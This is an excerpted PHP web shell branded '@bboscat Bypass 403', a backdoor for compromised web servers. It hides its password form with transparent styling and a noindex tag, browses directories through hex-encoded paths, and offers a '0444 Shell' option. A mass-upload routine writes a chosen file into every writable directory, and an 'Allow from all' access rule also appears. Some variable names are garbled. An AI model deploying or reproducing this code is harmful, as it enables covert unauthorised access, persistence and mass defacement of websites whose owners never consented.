...
$gcw = "getcwd";
$correctPassword = "bboscat13+37";
if (isset($_POST['bbospw'])) {
    $enteredPassword = $_POST['bbospw'];
...
<style>* {margin:0 !important;padding:0 !important;}</style><meta name=robots content=noindex><body><pre><form method=post style='position:absolute !important;'><input type=password name=bbospw style='background-color:transparent !important;border:none !important;outline:none !important;' required><input type=submit name='watching' value='submit' style='border:none !important;background-color:transparent !important;color:transparent !important;cursor:pointer !important;'></form></pre><iframe name='iframe_id' id='iframe_id' src=hdhdhhsjsjsjdj onload='document.title=this.contentDocument? this.contentDocument.title : this.contentWindow.document.title;' width=100% height=100% scrolling=auto frameborder=0 style='border:none !important;'></iframe>
...
?>
	...
	<head>
		<title>Bypass</title>
		<meta charset='UTF-8'>
		<meta name='author' content='@bboscat Bypass 403'>
	...
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>@bboscat Bypass 403</h4></a>";
			if(isset($_7['path'])){
				$path = unhex($_7['path']);
				chdir($path);
			}else{
		...
		<div class='container-fluid'>
			...
			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=0444'><i class='bi bi-file-earmark-lock'></i> 0444 Shell</a>
			</div>
			<div class='btn-group'>
		...
		if(is_writable($dir)) {
			...
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$รขโ€“ลก = $dirc.'/'.$namefile;
				if($dirb === '.') {
					$fungsi[2]($รขโ€“ลก, $contents_sc);
				} elseif($dirb === '..') {
					$fungsi[2]($รขโ€“ลก, $contents_sc);
				} else {
					if($fungsi[1]($dirc)) {
						if(is_writable($dirc)) {
							echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$รขโ€“ลก<br>";
							$fungsi[2]($รขโ€“ลก, $contents_sc);
							$รขโ€“ลธ = mass_all($dirc,$namefile,$contents_sc);
							}
						}
					}
				}
...
Allow from all
		...
		</div><div class='text-secondary'>&copy Bypass - @bboscat Bypass 403</div>
	</div>
</div>
</body>
</html>